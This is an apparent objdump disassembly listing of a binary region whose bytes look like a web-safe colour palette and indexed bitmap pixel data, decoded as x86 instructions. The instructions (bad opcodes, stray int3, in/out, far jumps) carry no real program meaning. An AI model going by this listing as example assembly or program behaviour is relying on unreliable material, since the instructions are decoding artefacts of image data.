  42e5e2:	33 99 66 00 33 99    	xor    -0x66ccff9a(%ecx),%ebx
  42e5e8:	99                   	cltd
  42e5e9:	00 33                	add    %dh,(%ebx)
  42e5eb:	99                   	cltd
  42e5ec:	cc                   	int3
  42e5ed:	00 33                	add    %dh,(%ebx)
  42e5ef:	99                   	cltd
  42e5f0:	ff 00                	incl   (%eax)
  42e5f2:	33 cc                	xor    %esp,%ecx
  42e5f4:	00 00                	add    %al,(%eax)
  42e5f6:	33 cc                	xor    %esp,%ecx
  42e5f8:	33 00                	xor    (%eax),%eax
  42e5fa:	33 cc                	xor    %esp,%ecx
  42e5fc:	66 00 33             	data16 add %dh,(%ebx)
  42e5ff:	cc                   	int3
  42e600:	99                   	cltd
  42e601:	00 33                	add    %dh,(%ebx)
  42e603:	cc                   	int3
  42e604:	cc                   	int3
  42e605:	00 33                	add    %dh,(%ebx)
  42e607:	cc                   	int3
  42e608:	ff 00                	incl   (%eax)
  42e60a:	33 ff                	xor    %edi,%edi
  42e60c:	33 00                	xor    (%eax),%eax
  42e60e:	33 ff                	xor    %edi,%edi
  42e610:	66 00 33             	data16 add %dh,(%ebx)
  42e613:	ff 99 00 33 ff cc    	lcall  *-0x3300cd00(%ecx)
  42e619:	00 33                	add    %dh,(%ebx)
  42e61b:	ff                   	(bad)
  42e61c:	ff 00                	incl   (%eax)
  42e61e:	66 00 00             	data16 add %al,(%eax)
  42e621:	00 66 00             	add    %ah,0x0(%esi)
  42e624:	33 00                	xor    (%eax),%eax
  42e626:	66 00 66 00          	data16 add %ah,0x0(%esi)
  42e62a:	66 00 99 00 66 00 cc 	data16 add %bl,-0x33ff9a00(%ecx)
  42e631:	00 66 00             	add    %ah,0x0(%esi)
  42e634:	ff 00                	incl   (%eax)
  42e636:	66 33 00             	xor    (%eax),%ax
  42e639:	00 66 33             	add    %ah,0x33(%esi)
  42e63c:	33 00                	xor    (%eax),%eax
  42e63e:	66 33 66 00          	xor    0x0(%esi),%sp
  42e642:	66 33 99 00 66 33 cc 	xor    -0x33cc9a00(%ecx),%bx
  42e649:	00 66 33             	add    %ah,0x33(%esi)
  42e64c:	ff 00                	incl   (%eax)
  42e64e:	66 66 00 00          	data16 data16 add %al,(%eax)
  42e652:	66 66 33 00          	data16 xor (%eax),%ax
  42e656:	66 66 66 00 66 66    	data16 data16 data16 add %ah,0x66(%esi)
  42e65c:	99                   	cltd
  42e65d:	00 66 66             	add    %ah,0x66(%esi)
  42e660:	cc                   	int3
  42e661:	00 66 99             	add    %ah,-0x67(%esi)
  42e664:	00 00                	add    %al,(%eax)
  42e666:	66 99                	cwtd
  42e668:	33 00                	xor    (%eax),%eax
  42e66a:	66 99                	cwtd
  42e66c:	66 00 66 99          	data16 add %ah,-0x67(%esi)
  42e670:	99                   	cltd
  42e671:	00 66 99             	add    %ah,-0x67(%esi)
  42e674:	cc                   	int3
  42e675:	00 66 99             	add    %ah,-0x67(%esi)
  42e678:	ff 00                	incl   (%eax)
  42e67a:	66 cc                	data16 int3
  42e67c:	00 00                	add    %al,(%eax)
  42e67e:	66 cc                	data16 int3
  42e680:	33 00                	xor    (%eax),%eax
  42e682:	66 cc                	data16 int3
  42e684:	99                   	cltd
  42e685:	00 66 cc             	add    %ah,-0x34(%esi)
  42e688:	cc                   	int3
  42e689:	00 66 cc             	add    %ah,-0x34(%esi)
  42e68c:	ff 00                	incl   (%eax)
  42e68e:	66 ff 00             	incw   (%eax)
  42e691:	00 66 ff             	add    %ah,-0x1(%esi)
  42e694:	33 00                	xor    (%eax),%eax
  42e696:	66 ff 99 00 66 ff cc 	lcallw *-0x33009a00(%ecx)
  42e69d:	00 cc                	add    %cl,%ah
  42e69f:	00 ff                	add    %bh,%bh
  42e6a1:	00 ff                	add    %bh,%bh
  42e6a3:	00 cc                	add    %cl,%ah
  42e6a5:	00 99 99 00 00 99    	add    %bl,-0x66ffff67(%ecx)
  42e6ab:	33 99 00 99 00 99    	xor    -0x66ff6700(%ecx),%ebx
  42e6b1:	00 99 00 cc 00 99    	add    %bl,-0x66ff3400(%ecx)
  42e6b7:	00 00                	add    %al,(%eax)
  42e6b9:	00 99 33 33 00 99    	add    %bl,-0x66ffcccd(%ecx)
  42e6bf:	00 66 00             	add    %ah,0x0(%esi)
  42e6c2:	99                   	cltd
  42e6c3:	33 cc                	xor    %esp,%ecx
  42e6c5:	00 99 00 ff 00 99    	add    %bl,-0x66ff0100(%ecx)
  42e6cb:	66 00 00             	data16 add %al,(%eax)
  42e6ce:	99                   	cltd
  42e6cf:	66 33 00             	xor    (%eax),%ax
  42e6d2:	99                   	cltd
  42e6d3:	33 66 00             	xor    0x0(%esi),%esp
  42e6d6:	99                   	cltd
  42e6d7:	66 99                	cwtd
  42e6d9:	00 99 66 cc 00 99    	add    %bl,-0x66ff339a(%ecx)
  42e6df:	33 ff                	xor    %edi,%edi
  42e6e1:	00 99 99 33 00 99    	add    %bl,-0x66ffcc67(%ecx)
  42e6e7:	99                   	cltd
  42e6e8:	66 00 99 99 99 00 99 	data16 add %bl,-0x66ff6667(%ecx)
  42e6ef:	99                   	cltd
  42e6f0:	cc                   	int3
  42e6f1:	00 99 99 ff 00 99    	add    %bl,-0x66ff0067(%ecx)
  42e6f7:	cc                   	int3
  42e6f8:	00 00                	add    %al,(%eax)
  42e6fa:	99                   	cltd
  42e6fb:	cc                   	int3
  42e6fc:	33 00                	xor    (%eax),%eax
  42e6fe:	66 cc                	data16 int3
  42e700:	66 00 99 cc 99 00 99 	data16 add %bl,-0x66ff6634(%ecx)
  42e707:	cc                   	int3
  42e708:	cc                   	int3
  42e709:	00 99 cc ff 00 99    	add    %bl,-0x66ff0034(%ecx)
  42e70f:	ff 00                	incl   (%eax)
  42e711:	00 99 ff 33 00 99    	add    %bl,-0x66ffcc01(%ecx)
  42e717:	cc                   	int3
  42e718:	66 00 99 ff 99 00 99 	data16 add %bl,-0x66ff6601(%ecx)
  42e71f:	ff cc                	dec    %esp
  42e721:	00 99 ff ff 00 cc    	add    %bl,-0x33ff0001(%ecx)
  42e727:	00 00                	add    %al,(%eax)
  42e729:	00 99 00 33 00 cc    	add    %bl,-0x33ffcd00(%ecx)
  42e72f:	00 66 00             	add    %ah,0x0(%esi)
  42e732:	cc                   	int3
  42e733:	00 99 00 cc 00 cc    	add    %bl,-0x33ff3400(%ecx)
  42e739:	00 99 33 00 00 cc    	add    %bl,-0x33ffffcd(%ecx)
  42e73f:	33 33                	xor    (%ebx),%esi
  42e741:	00 cc                	add    %cl,%ah
  42e743:	33 66 00             	xor    0x0(%esi),%esp
  42e746:	cc                   	int3
  42e747:	33 99 00 cc 33 cc    	xor    -0x33cc3400(%ecx),%ebx
  42e74d:	00 cc                	add    %cl,%ah
  42e74f:	33 ff                	xor    %edi,%edi
  42e751:	00 cc                	add    %cl,%ah
  42e753:	66 00 00             	data16 add %al,(%eax)
  42e756:	cc                   	int3
  42e757:	66 33 00             	xor    (%eax),%ax
  42e75a:	99                   	cltd
  42e75b:	66 66 00 cc          	data16 data16 add %cl,%ah
  42e75f:	66 99                	cwtd
  42e761:	00 cc                	add    %cl,%ah
  42e763:	66 cc                	data16 int3
  42e765:	00 99 66 ff 00 cc    	add    %bl,-0x33ff009a(%ecx)
  42e76b:	99                   	cltd
  42e76c:	00 00                	add    %al,(%eax)
  42e76e:	cc                   	int3
  42e76f:	99                   	cltd
  42e770:	33 00                	xor    (%eax),%eax
  42e772:	cc                   	int3
  42e773:	99                   	cltd
  42e774:	66 00 cc             	data16 add %cl,%ah
  42e777:	99                   	cltd
  42e778:	99                   	cltd
  42e779:	00 cc                	add    %cl,%ah
  42e77b:	99                   	cltd
  42e77c:	cc                   	int3
  42e77d:	00 cc                	add    %cl,%ah
  42e77f:	99                   	cltd
  42e780:	ff 00                	incl   (%eax)
  42e782:	cc                   	int3
  42e783:	cc                   	int3
  42e784:	00 00                	add    %al,(%eax)
  42e786:	cc                   	int3
  42e787:	cc                   	int3
  42e788:	33 00                	xor    (%eax),%eax
  42e78a:	cc                   	int3
  42e78b:	cc                   	int3
  42e78c:	66 00 cc             	data16 add %cl,%ah
  42e78f:	cc                   	int3
  42e790:	99                   	cltd
  42e791:	00 cc                	add    %cl,%ah
  42e793:	cc                   	int3
  42e794:	cc                   	int3
  42e795:	00 cc                	add    %cl,%ah
  42e797:	cc                   	int3
  42e798:	ff 00                	incl   (%eax)
  42e79a:	cc                   	int3
  42e79b:	ff 00                	incl   (%eax)
  42e79d:	00 cc                	add    %cl,%ah
  42e79f:	ff 33                	push   (%ebx)
  42e7a1:	00 99 ff 66 00 cc    	add    %bl,-0x33ff9901(%ecx)
  42e7a7:	ff 99 00 cc ff cc    	lcall  *-0x33003400(%ecx)
  42e7ad:	00 cc                	add    %cl,%ah
  42e7af:	ff                   	(bad)
  42e7b0:	ff 00                	incl   (%eax)
  42e7b2:	cc                   	int3
  42e7b3:	00 33                	add    %dh,(%ebx)
  42e7b5:	00 ff                	add    %bh,%bh
  42e7b7:	00 66 00             	add    %ah,0x0(%esi)
  42e7ba:	ff 00                	incl   (%eax)
  42e7bc:	99                   	cltd
  42e7bd:	00 cc                	add    %cl,%ah
  42e7bf:	33 00                	xor    (%eax),%eax
  42e7c1:	00 ff                	add    %bh,%bh
  42e7c3:	33 33                	xor    (%ebx),%esi
  42e7c5:	00 ff                	add    %bh,%bh
  42e7c7:	33 66 00             	xor    0x0(%esi),%esp
  42e7ca:	ff 33                	push   (%ebx)
  42e7cc:	99                   	cltd
  42e7cd:	00 ff                	add    %bh,%bh
  42e7cf:	33 cc                	xor    %esp,%ecx
  42e7d1:	00 ff                	add    %bh,%bh
  42e7d3:	33 ff                	xor    %edi,%edi
  42e7d5:	00 ff                	add    %bh,%bh
  42e7d7:	66 00 00             	data16 add %al,(%eax)
  42e7da:	ff 66 33             	jmp    *0x33(%esi)
  42e7dd:	00 cc                	add    %cl,%ah
  42e7df:	66 66 00 ff          	data16 data16 add %bh,%bh
  42e7e3:	66 99                	cwtd
  42e7e5:	00 ff                	add    %bh,%bh
  42e7e7:	66 cc                	data16 int3
  42e7e9:	00 cc                	add    %cl,%ah
  42e7eb:	66 ff 00             	incw   (%eax)
  42e7ee:	ff 99 00 00 ff 99    	lcall  *-0x66010000(%ecx)
  42e7f4:	33 00                	xor    (%eax),%eax
  42e7f6:	ff 99 66 00 ff 99    	lcall  *-0x6600ff9a(%ecx)
  42e7fc:	99                   	cltd
  42e7fd:	00 ff                	add    %bh,%bh
  42e7ff:	99                   	cltd
  42e800:	cc                   	int3
  42e801:	00 ff                	add    %bh,%bh
  42e803:	99                   	cltd
  42e804:	ff 00                	incl   (%eax)
  42e806:	ff cc                	dec    %esp
  42e808:	00 00                	add    %al,(%eax)
  42e80a:	ff cc                	dec    %esp
  42e80c:	33 00                	xor    (%eax),%eax
  42e80e:	ff cc                	dec    %esp
  42e810:	66 00 ff             	data16 add %bh,%bh
  42e813:	cc                   	int3
  42e814:	99                   	cltd
  42e815:	00 ff                	add    %bh,%bh
  42e817:	cc                   	int3
  42e818:	cc                   	int3
  42e819:	00 ff                	add    %bh,%bh
  42e81b:	cc                   	int3
  42e81c:	ff 00                	incl   (%eax)
  42e81e:	ff                   	(bad)
  42e81f:	ff 33                	push   (%ebx)
  42e821:	00 cc                	add    %cl,%ah
  42e823:	ff 66 00             	jmp    *0x0(%esi)
  42e826:	ff                   	(bad)
  42e827:	ff 99 00 ff ff cc    	lcall  *-0x33000100(%ecx)
  42e82d:	00 66 66             	add    %ah,0x66(%esi)
  42e830:	ff 00                	incl   (%eax)
  42e832:	66 ff 66 00          	jmpw   *0x0(%esi)
  42e836:	66 ff                	data16 (bad)
  42e838:	ff 00                	incl   (%eax)
  42e83a:	ff 66 66             	jmp    *0x66(%esi)
  42e83d:	00 ff                	add    %bh,%bh
  42e83f:	66 ff 00             	incw   (%eax)
  42e842:	ff                   	(bad)
  42e843:	ff 66 00             	jmp    *0x0(%esi)
  42e846:	21 00                	and    %eax,(%eax)
  42e848:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42e849:	00 5f 5f             	add    %bl,0x5f(%edi)
  42e84c:	5f                   	pop    %edi
  42e84d:	00 77 77             	add    %dh,0x77(%edi)
  42e850:	77 00                	ja     0x42e852
  42e852:	86 86 86 00 96 96    	xchg   %al,-0x6969ff7a(%esi)
  42e858:	96                   	xchg   %eax,%esi
  42e859:	00 cb                	add    %cl,%bl
  42e85b:	cb                   	lret
  42e85c:	cb                   	lret
  42e85d:	00 b2 b2 b2 00 d7    	add    %dh,-0x28ff4d4e(%edx)
  42e863:	d7                   	xlat   %ds:(%ebx)
  42e864:	d7                   	xlat   %ds:(%ebx)
  42e865:	00 dd                	add    %bl,%ch
  42e867:	dd dd                	fstp   %st(5)
  42e869:	00 e3                	add    %ah,%bl
  42e86b:	e3 e3                	jecxz  0x42e850
  42e86d:	00 ea                	add    %ch,%dl
  42e86f:	ea ea 00 f1 f1 f1 00 	ljmp   $0xf1,$0xf1f100ea
  42e876:	f8                   	clc
  42e877:	f8                   	clc
  42e878:	f8                   	clc
  42e879:	00 f0                	add    %dh,%al
  42e87b:	fb                   	sti
  42e87c:	ff 00                	incl   (%eax)
  42e87e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42e87f:	a0 a0 00 80 80       	mov    0x808000a0,%al
  42e884:	80 00 00             	addb   $0x0,(%eax)
  42e887:	00 ff                	add    %bh,%bh
  42e889:	00 00                	add    %al,(%eax)
  42e88b:	ff 00                	incl   (%eax)
  42e88d:	00 00                	add    %al,(%eax)
  42e88f:	ff                   	(bad)
  42e890:	ff 00                	incl   (%eax)
  42e892:	ff 00                	incl   (%eax)
  42e894:	00 00                	add    %al,(%eax)
  42e896:	ff 00                	incl   (%eax)
  42e898:	ff 00                	incl   (%eax)
  42e89a:	ff                   	(bad)
  42e89b:	ff 00                	incl   (%eax)
  42e89d:	00 ff                	add    %bh,%bh
  42e89f:	ff                   	(bad)
  42e8a0:	ff 00                	incl   (%eax)
  42e8a2:	0a 0a                	or     (%edx),%cl
  42e8a4:	0a 0a                	or     (%edx),%cl
  42e8a6:	0a 0a                	or     (%edx),%cl
  42e8a8:	0a 0a                	or     (%edx),%cl
  42e8aa:	0a 0a                	or     (%edx),%cl
  42e8ac:	0a 0a                	or     (%edx),%cl
  42e8ae:	0a 0a                	or     (%edx),%cl
  42e8b0:	0a ea                	or     %dl,%ch
  42e8b2:	ea ea 43 43 43 0a 0a 	ljmp   $0xa0a,$0x434343ea
  42e8b9:	0a 0a                	or     (%edx),%cl
  42e8bb:	0a 0a                	or     (%edx),%cl
  42e8bd:	0a 0a                	or     (%edx),%cl
  42e8bf:	0a 0a                	or     (%edx),%cl
  42e8c1:	0a 0a                	or     (%edx),%cl
  42e8c3:	0a 0a                	or     (%edx),%cl
  42e8c5:	0a 0a                	or     (%edx),%cl
  42e8c7:	0a 0a                	or     (%edx),%cl
  42e8c9:	0a 0a                	or     (%edx),%cl
  42e8cb:	0a 0a                	or     (%edx),%cl
  42e8cd:	0a 0a                	or     (%edx),%cl
  42e8cf:	ea ea 99 99 a0 c2 b9 	ljmp   $0xb9c2,$0xa09999ea
  42e8d6:	b2 43                	mov    $0x43,%dl
  42e8d8:	43                   	inc    %ebx
  42e8d9:	0a 0a                	or     (%edx),%cl
  42e8db:	0a 0a                	or     (%edx),%cl
  42e8dd:	0a 0a                	or     (%edx),%cl
  42e8df:	0a 0a                	or     (%edx),%cl
  42e8e1:	0a 0a                	or     (%edx),%cl
  42e8e3:	0a ec                	or     %ah,%ch
  42e8e5:	bc ff bc ff 0a       	mov    $0xaffbcff,%esp
  42e8ea:	0a 0a                	or     (%edx),%cl
  42e8ec:	0a 0a                	or     (%edx),%cl
  42e8ee:	ea 07 07 99 99 a0 c2 	ljmp   $0xc2a0,$0x99990707
  42e8f5:	b9 b2 81 c1 43       	mov    $0x43c181b2,%ecx
  42e8fa:	0a 0a                	or     (%edx),%cl
  42e8fc:	0a 0a                	or     (%edx),%cl
  42e8fe:	0a 0a                	or     (%edx),%cl
  42e900:	0a 0a                	or     (%edx),%cl
  42e902:	0a 0a                	or     (%edx),%cl
  42e904:	ec                   	in     (%dx),%al
  42e905:	ff                   	(bad)
  42e906:	bc ff bc 0a ec       	mov    $0xec0abcff,%esp
  42e90b:	0a 0a                	or     (%edx),%cl
  42e90d:	ea ef 07 07 07 99 a0 	ljmp   $0xa099,$0x70707ef
  42e914:	b9 b2 81 c1 c1       	mov    $0xc1c181b2,%ecx
  42e919:	c1 43 0a 0a          	roll   $0xa,0xa(%ebx)
  42e91d:	0a 0a                	or     (%edx),%cl
  42e91f:	0a 0a                	or     (%edx),%cl
  42e921:	0a 0a                	or     (%edx),%cl
  42e923:	0a ec                	or     %ah,%ch
  42e925:	bc ff bc ff 0a       	mov    $0xaffbcff,%esp
  42e92a:	f7 ec                	imul   %esp
  42e92c:	0a eb                	or     %bl,%ch
  42e92e:	ef                   	out    %eax,(%dx)
  42e92f:	ef                   	out    %eax,(%dx)
  42e930:	07                   	pop    %es
  42e931:	07                   	pop    %es
  42e932:	99                   	cltd
  42e933:	a0 b2 81 c1 c1       	mov    0xc1c181b2,%al
  42e938:	f2 f2 43             	repnz repnz inc %ebx
  42e93b:	0a 0a                	or     (%edx),%cl
  42e93d:	0a 0a                	or     (%edx),%cl
  42e93f:	0a 0a                	or     (%edx),%cl
  42e941:	0a 0a                	or     (%edx),%cl
  42e943:	0a ec                	or     %ah,%ch
  42e945:	ff                   	(bad)
  42e946:	bc ff bc 0a ec       	mov    $0xec0abcff,%esp
  42e94b:	f7 ea                	imul   %edx
  42e94d:	ef                   	out    %eax,(%dx)
  42e94e:	ef                   	out    %eax,(%dx)
  42e94f:	ef                   	out    %eax,(%dx)
  42e950:	ef                   	out    %eax,(%dx)
  42e951:	07                   	pop    %es
  42e952:	99                   	cltd
  42e953:	99                   	cltd
  42e954:	81 c1 f2 f2 f2 f2    	add    $0xf2f2f2f2,%ecx
  42e95a:	f2 43                	repnz inc %ebx
  42e95c:	0a 0a                	or     (%edx),%cl
  42e95e:	0a 0a                	or     (%edx),%cl
  42e960:	0a 0a                	or     (%edx),%cl
  42e962:	0a 0a                	or     (%edx),%cl
  42e964:	ec                   	in     (%dx),%al
  42e965:	bc ff bc ff 0a       	mov    $0xaffbcff,%esp
  42e96a:	f7 ec                	imul   %esp
  42e96c:	ea bc ef ef ef ef 07 	ljmp   $0x7ef,$0xefefefbc
  42e973:	0a 0a                	or     (%edx),%cl
  42e975:	f2 f2 f2 ef          	repnz repnz repnz out %eax,(%dx)
  42e979:	ef                   	out    %eax,(%dx)
  42e97a:	ef                   	out    %eax,(%dx)
  42e97b:	43                   	inc    %ebx
  42e97c:	0a 0a                	or     (%edx),%cl
  42e97e:	0a 0a                	or     (%edx),%cl
  42e980:	0a 0a                	or     (%edx),%cl
  42e982:	0a 0a                	or     (%edx),%cl
  42e984:	ec                   	in     (%dx),%al
  42e985:	ff                   	(bad)
  42e986:	bc ff bc 0a ec       	mov    $0xec0abcff,%esp
  42e98b:	f7 ea                	imul   %edx
  42e98d:	bc bc bc ef ef       	mov    $0xefefbcbc,%esp
  42e992:	0a 0a                	or     (%edx),%cl
  42e994:	0a 0a                	or     (%edx),%cl
  42e996:	ec                   	in     (%dx),%al
  42e997:	ec                   	in     (%dx),%al
  42e998:	ec                   	in     (%dx),%al
  42e999:	ef                   	out    %eax,(%dx)
  42e99a:	ef                   	out    %eax,(%dx)
  42e99b:	43                   	inc    %ebx
  42e99c:	0a 0a                	or     (%edx),%cl
  42e99e:	0a 0a                	or     (%edx),%cl
  42e9a0:	0a 0a                	or     (%edx),%cl
  42e9a2:	0a 0a                	or     (%edx),%cl
  42e9a4:	ec                   	in     (%dx),%al
  42e9a5:	bc ff bc ff 0a       	mov    $0xaffbcff,%esp
  42e9aa:	f7 ec                	imul   %esp
  42e9ac:	ea 92 92 92 92 92 0a 	ljmp   $0xa92,$0x92929292
  42e9b3:	0a 0a                	or     (%edx),%cl
  42e9b5:	0a f0                	or     %al,%dh
  42e9b7:	f0 ec                	lock in (%dx),%al
  42e9b9:	ec                   	in     (%dx),%al
  42e9ba:	ec                   	in     (%dx),%al
  42e9bb:	43                   	inc    %ebx
  42e9bc:	0a 0a                	or     (%edx),%cl
  42e9be:	0a 0a                	or     (%edx),%cl
  42e9c0:	0a 0a                	or     (%edx),%cl
  42e9c2:	0a 0a                	or     (%edx),%cl
  42e9c4:	ec                   	in     (%dx),%al
  42e9c5:	ff                   	(bad)
  42e9c6:	bc ff bc 0a ec       	mov    $0xec0abcff,%esp
  42e9cb:	f7 ea                	imul   %edx
  42e9cd:	f2 f2 c1 c1 b9       	repnz repnz rol $0xb9,%ecx
  42e9d2:	b9 0a 0a ef f7       	mov    $0xf7ef0a0a,%ecx
  42e9d7:	ff f0                	push   %eax
  42e9d9:	ef                   	out    %eax,(%dx)
  42e9da:	ef                   	out    %eax,(%dx)
  42e9db:	43                   	inc    %ebx
  42e9dc:	0a 0a                	or     (%edx),%cl
  42e9de:	0a 0a                	or     (%edx),%cl
  42e9e0:	0a 0a                	or     (%edx),%cl
  42e9e2:	0a 0a                	or     (%edx),%cl
  42e9e4:	ec                   	in     (%dx),%al
  42e9e5:	ff                   	(bad)
  42e9e6:	ff                   	(bad)
  42e9e7:	ff                   	(bad)
  42e9e8:	ff 0a                	decl   (%edx)
  42e9ea:	f7 ec                	imul   %esp
  42e9ec:	ea f2 c1 b9 b9 b3 91 	ljmp   $0x91b3,$0xb9b9c1f2
  42e9f3:	91                   	xchg   %eax,%ecx
  42e9f4:	79 ef                	jns    0x42e9e5
  42e9f6:	f7 07 ff f0 f0 43    	testl  $0x43f0f0ff,(%edi)
  42e9fc:	0a 0a                	or     (%edx),%cl
  42e9fe:	0a 0a                	or     (%edx),%cl
  42ea00:	0a 0a                	or     (%edx),%cl
  42ea02:	0a 0a                	or     (%edx),%cl
  42ea04:	ec                   	in     (%dx),%al
  42ea05:	ff                   	(bad)
  42ea06:	ff                   	(bad)
  42ea07:	ff                   	(bad)
  42ea08:	ff 0a                	decl   (%edx)
  42ea0a:	ec                   	in     (%dx),%al
  42ea0b:	f7 ec                	imul   %esp
  42ea0d:	ea b9 b9 b3 91 9d a0 	ljmp   $0xa09d,$0x91b3b9b9
  42ea14:	79 ef                	jns    0x42ea05
  42ea16:	ef                   	out    %eax,(%dx)
  42ea17:	f7 07 ff 43 0a 0a    	testl  $0xa0a43ff,(%edi)
  42ea1d:	0a 0a                	or     (%edx),%cl
  42ea1f:	0a 0a                	or     (%edx),%cl
  42ea21:	0a 0a                	or     (%edx),%cl
  42ea23:	0a ec                	or     %ah,%ch
  42ea25:	ff                   	(bad)
  42ea26:	ff                   	(bad)
  42ea27:	ff                   	(bad)
  42ea28:	ff 0a                	decl   (%edx)
  42ea2a:	f7 ec                	imul   %esp
  42ea2c:	f7 ea                	imul   %edx
  42ea2e:	b9 b3 b3 91 a0       	mov    $0xa091b3b3,%ecx
  42ea33:	a0 79 79 ef f7       	mov    0xf7ef7979,%al
  42ea38:	f7 07 43 07 07 07    	testl  $0x7070743,(%edi)
  42ea3e:	07                   	pop    %es
  42ea3f:	07                   	pop    %es
  42ea40:	0a 0a                	or     (%edx),%cl
  42ea42:	0a 0a                	or     (%edx),%cl
  42ea44:	ec                   	in     (%dx),%al
  42ea45:	ff                   	(bad)
  42ea46:	ff                   	(bad)
  42ea47:	ff                   	(bad)
  42ea48:	ff 0a                	decl   (%edx)
  42ea4a:	f7 f7                	div    %edi
  42ea4c:	f7 f7                	div    %edi
  42ea4e:	ea b3 91 9d a0 79 79 	ljmp   $0x7979,$0xa09d91b3
  42ea55:	79 ef                	jns    0x42ea46
  42ea57:	ef                   	out    %eax,(%dx)
  42ea58:	f7 43 0a 0a 0a 0a 07 	testl  $0x70a0a0a,0xa(%ebx)
  42ea5f:	ef                   	out    %eax,(%dx)
  42ea60:	ec                   	in     (%dx),%al
  42ea61:	0a 0a                	or     (%edx),%cl
  42ea63:	0a ec                	or     %ah,%ch
  42ea65:	ff                   	(bad)
  42ea66:	ff                   	(bad)
  42ea67:	ff                   	(bad)
  42ea68:	ff 0a                	decl   (%edx)
  42ea6a:	f7 f7                	div    %edi
  42ea6c:	f7 f7                	div    %edi
  42ea6e:	0a eb                	or     %bl,%ch
  42ea70:	eb 9d                	jmp    0x42ea0f
  42ea72:	a0 79 79 79 ef       	mov    0xef797979,%al
  42ea77:	43                   	inc    %ebx
  42ea78:	43                   	inc    %ebx
  42ea79:	ec                   	in     (%dx),%al
  42ea7a:	ec                   	in     (%dx),%al
  42ea7b:	ec                   	in     (%dx),%al
  42ea7c:	ec                   	in     (%dx),%al
  42ea7d:	ec                   	in     (%dx),%al
  42ea7e:	07                   	pop    %es
  42ea7f:	07                   	pop    %es
  42ea80:	ec                   	in     (%dx),%al
  42ea81:	0a 0a                	or     (%edx),%cl
  42ea83:	0a ec                	or     %ah,%ch
  42ea85:	ff                   	(bad)
  42ea86:	ff                   	(bad)
  42ea87:	ff                   	(bad)
  42ea88:	ff 0a                	decl   (%edx)
  42ea8a:	f7 f7                	div    %edi
  42ea8c:	f7 f7                	div    %edi
  42ea8e:	0a ff                	or     %bh,%bh
  42ea90:	ff                   	ljmp   (bad)
  42ea91:	ed                   	in     (%dx),%eax
  42ea92:	ed                   	in     (%dx),%eax
  42ea93:	ed                   	in     (%dx),%eax
  42ea94:	ed                   	in     (%dx),%eax
  42ea95:	eb eb                	jmp    0x42ea82
  42ea97:	ff                   	(bad)
  42ea98:	ff                   	(bad)
  42ea99:	ff                   	(bad)
  42ea9a:	ff                   	(bad)
  42ea9b:	ff                   	(bad)
  42ea9c:	ff                   	(bad)
  42ea9d:	ff                   	(bad)
  42ea9e:	ff                   	(bad)
  42ea9f:	ff                   	ljmp   (bad)
  42eaa0:	ec                   	in     (%dx),%al
  42eaa1:	0a 0a                	or     (%edx),%cl
  42eaa3:	0a ec                	or     %ah,%ch
  42eaa5:	ec                   	in     (%dx),%al
  42eaa6:	ec                   	in     (%dx),%al
  42eaa7:	ec                   	in     (%dx),%al
  42eaa8:	ec                   	in     (%dx),%al
  42eaa9:	0a f7                	or     %bh,%dh
  42eaab:	f7 f7                	div    %edi
  42eaad:	f7 0a ec ec ec ec    	testl  $0xecececec,(%edx)
  42eab3:	ec                   	in     (%dx),%al
  42eab4:	ec                   	in     (%dx),%al
  42eab5:	ec                   	in     (%dx),%al
  42eab6:	ec                   	in     (%dx),%al
  42eab7:	ec                   	in     (%dx),%al
  42eab8:	ec                   	in     (%dx),%al
  42eab9:	ec                   	in     (%dx),%al
  42eaba:	ec                   	in     (%dx),%al
  42eabb:	ec                   	in     (%dx),%al
  42eabc:	ec                   	in     (%dx),%al
  42eabd:	ec                   	in     (%dx),%al
  42eabe:	ec                   	in     (%dx),%al
  42eabf:	ef                   	out    %eax,(%dx)
  42eac0:	ec                   	in     (%dx),%al
  42eac1:	0a 0a                	or     (%edx),%cl
  42eac3:	0a ea                	or     %dl,%ch
  42eac5:	ea ea ea ea 0a f7 f7 	ljmp   $0xf7f7,$0xaeaeaea
  42eacc:	f7 f7                	div    %edi
  42eace:	0a 0a                	or     (%edx),%cl
  42ead0:	0a 0a                	or     (%edx),%cl
  42ead2:	0a 0a                	or     (%edx),%cl
  42ead4:	0a 0a                	or     (%edx),%cl
  42ead6:	0a 0a                	or     (%edx),%cl
  42ead8:	0a 0a                	or     (%edx),%cl
  42eada:	0a 0a                	or     (%edx),%cl
  42eadc:	0a 0a                	or     (%edx),%cl
  42eade:	0a 0a                	or     (%edx),%cl
  42eae0:	ef                   	out    %eax,(%dx)
  42eae1:	0c 0a                	or     $0xa,%al
  42eae3:	ec                   	in     (%dx),%al
  42eae4:	ff                   	(bad)
  42eae5:	ff                   	(bad)
  42eae6:	ff                   	(bad)
  42eae7:	ff                   	(bad)
  42eae8:	ff                   	ljmp   (bad)
  42eae9:	ea 0a f7 f7 f7 0a ec 	ljmp   $0xec0a,$0xf7f7f70a
  42eaf0:	07                   	pop    %es
  42eaf1:	07                   	pop    %es
  42eaf2:	07                   	pop    %es
  42eaf3:	07                   	pop    %es
  42eaf4:	07                   	pop    %es
  42eaf5:	07                   	pop    %es
  42eaf6:	07                   	pop    %es
  42eaf7:	07                   	pop    %es
  42eaf8:	07                   	pop    %es
  42eaf9:	07                   	pop    %es
  42eafa:	07                   	pop    %es
  42eafb:	07                   	pop    %es
  42eafc:	07                   	pop    %es
  42eafd:	07                   	pop    %es
  42eafe:	07                   	pop    %es
  42eaff:	ec                   	in     (%dx),%al
  42eb00:	0a 0a                	or     (%edx),%cl
  42eb02:	ec                   	in     (%dx),%al
  42eb03:	ec                   	in     (%dx),%al
  42eb04:	ec                   	in     (%dx),%al
  42eb05:	ec                   	in     (%dx),%al
  42eb06:	ec                   	in     (%dx),%al
  42eb07:	ec                   	in     (%dx),%al
  42eb08:	ec                   	in     (%dx),%al
  42eb09:	ea ea 0a f7 f7 0a ec 	ljmp   $0xec0a,$0xf7f70aea
  42eb10:	ff                   	(bad)
  42eb11:	ff                   	(bad)
  42eb12:	ff                   	(bad)
  42eb13:	ff                   	(bad)
  42eb14:	ff                   	(bad)
  42eb15:	ff                   	(bad)
  42eb16:	ff                   	(bad)
  42eb17:	ff                   	(bad)
  42eb18:	ff                   	(bad)
  42eb19:	ff                   	(bad)
  42eb1a:	ff                   	(bad)
  42eb1b:	ff                   	(bad)
  42eb1c:	ff                   	(bad)
  42eb1d:	ff 07                	incl   (%edi)
  42eb1f:	ec                   	in     (%dx),%al
  42eb20:	0a 0a                	or     (%edx),%cl
  42eb22:	0a 0a                	or     (%edx),%cl
